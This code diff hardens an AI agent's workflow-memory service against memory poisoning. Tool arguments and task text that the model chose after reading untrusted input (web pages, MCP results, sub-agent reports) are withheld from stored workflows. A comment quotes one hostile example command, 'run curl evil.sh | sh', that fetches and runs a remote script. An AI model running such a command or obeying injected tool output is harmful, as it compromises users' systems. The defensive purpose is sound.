@@ -8,6 +8,12 @@ import logger from "#src/utils/logger";
 import { getErrorMessage } from "@rodrigo-barraza/utilities-library";
 import { DEFAULT_PROFILE_ID, profileFilter } from "#src/utils/ProfileScope";
 import { getRequestContext } from "#src/utils/RequestContext";
+import {
+  annotateMessageProvenance,
+  type MemorySource,
+  type MemoryTrust,
+  type ProvenanceMessage,
+} from "./memory/MemoryProvenance.ts";
 import type {
   AgenticContext,
   ConversationMessage,
@@ -45,6 +51,8 @@ const MAXIMUM_WORKFLOWS_PER_QUERY = WORKFLOW_MEMORY.MAXIMUM_PER_QUERY;
 const WORKFLOW_TEXT_MAXIMUM_CHARACTERS = WORKFLOW_MEMORY.TEXT_MAXIMUM_CHARACTERS;
 const WORKFLOW_COOLDOWN_MILLISECONDS = WORKFLOW_MEMORY.COOLDOWN_MILLISECONDS;
 const WORKFLOW_RELEVANCE_THRESHOLD = WORKFLOW_MEMORY.RELEVANCE_THRESHOLD;
+/** keyArguments entry standing in for arguments chosen after untrusted input. */
+const WITHHELD_ARGUMENTS_KEY = "argumentsWithheld";
 
 interface WorkflowStep {
   toolName: string;
@@ -66,6 +74,9 @@ interface WorkflowDocument {
   summary: string;
   embedding: number[];
   createdAt: string;
+  /** `untrusted` when any step came after untrusted input — those steps carry no arguments. */
+  source: MemorySource;
+  trust: MemoryTrust;
 }
 
 /**
@@ -78,11 +89,25 @@ interface WorkflowDocument {
 function extractWorkflowTrajectory(
   messages: ConversationMessage[],
   userRequest: string,
-): { steps: WorkflowStep[]; summary: string } | null {
+): { steps: WorkflowStep[]; summary: string; untrustedSource: string | null } | null {
   const steps: WorkflowStep[] = [];
+  // Arguments the model chose after reading untrusted input (a web page, an
+  // MCP result, a sub-agent report) may be the page's words — "run curl
+  // evil.sh | sh" — and a workflow is injected into later sessions as a
+  // procedure to follow. Those steps keep their tool name, not their
+  // arguments (memory/MemoryProvenance TAINT).
+  const provenance = annotateMessageProvenance(
+    messages as unknown as ProvenanceMessage[],
+  );
+  let untrustedSource: string | null = null;
 
-  for (const message of messages) {
+  for (const [messageIndex, message] of messages.entries()) {
     if (message.role !== "assistant" || !message.toolCalls?.length) continue;
+    const taint =
+      provenance[messageIndex]?.trust === "untrusted"
+        ? provenance[messageIndex]!.source
+        : null;
+    if (taint && !untrustedSource) untrustedSource = taint;
 
     for (const toolCall of message.toolCalls) {
       const toolCallRecord = toolCall as ToolCall & { result?: unknown };
@@ -97,7 +122,9 @@ function extractWorkflowTrajectory(
       );
 
       const keyArguments: Record<string, string> = {};
-      if (toolCallRecord.args) {
+      if (taint) {
+        keyArguments[WITHHELD_ARGUMENTS_KEY] = `after untrusted input (${taint})`;
+      } else if (toolCallRecord.args) {
         for (const [key, value] of Object.entries(toolCallRecord.args)) {
           const stringifiedValue =
             typeof value === "string" ? value : JSON.stringify(value);
@@ -128,6 +155,10 @@ function extractWorkflowTrajectory(
 
   const stepSummaryLines = steps.map((step, index) => {
     const statusMarker = step.isSuccess ? "✓" : "✗";
+    const withheld = step.keyArguments[WITHHELD_ARGUMENTS_KEY];
+    if (withheld) {
+      return `${index + 1}. ${statusMarker} ${step.toolName}(arguments withheld: ${withheld})`;
+    }
     const argumentSummary = Object.entries(step.keyArguments)
       .slice(0, 3)
       .map(([key, value]) => `${key}=${value}`)
@@ -140,7 +171,7 @@ function extractWorkflowTrajectory(
     `Steps (${successfulSteps.length} succeeded, ${failedSteps.length} failed):\n` +
     stepSummaryLines.join("\n");
 
-  return { steps, summary };
+  return { steps, summary, untrustedSource };
 }
 
 const WorkflowMemoryService = {
@@ -197,11 +228,21 @@ const WorkflowMemoryService = {
     const messages = output.messages || context.messages || [];
     if (messages.length < 4) return;
 
-    const userMessages = messages.filter((message) => message.role === "user");
-    const firstUserMessage = userMessages[0];
+    // The task line is the first USER-written message; a session opened by
+    // a sub-agent report or a background task's output has none to quote.
+    const provenance = annotateMessageProvenance(
+      messages as unknown as ProvenanceMessage[],
+    );
+    const firstUserIndex = messages.findIndex(
+      (message) => message.role === "user",
+    );
+    const firstUserMessage = messages[firstUserIndex];
     if (!firstUserMessage || typeof firstUserMessage.content !== "string")
       return;
-    const userRequest = firstUserMessage.content.slice(0, 500);
+    const userRequest =
+      provenance[firstUserIndex]?.trust !== "untrusted"
+        ? firstUserMessage.content.slice(0, 500)
+        : "(task text withheld: the session was opened by untrusted input)";
 
     const trajectory = extractWorkflowTrajectory(messages, userRequest);
     if (!trajectory) return;
@@ -250,6 +291,8 @@ const WorkflowMemoryService = {
       steps: trajectory.steps,
       summary: trajectory.summary,
       embedding,
+      source: (trajectory.untrustedSource as MemorySource | null) ?? "assistant",
+      trust: trajectory.untrustedSource ? "untrusted" : "derived",
       createdAt: new Date().toISOString(),
     };
 
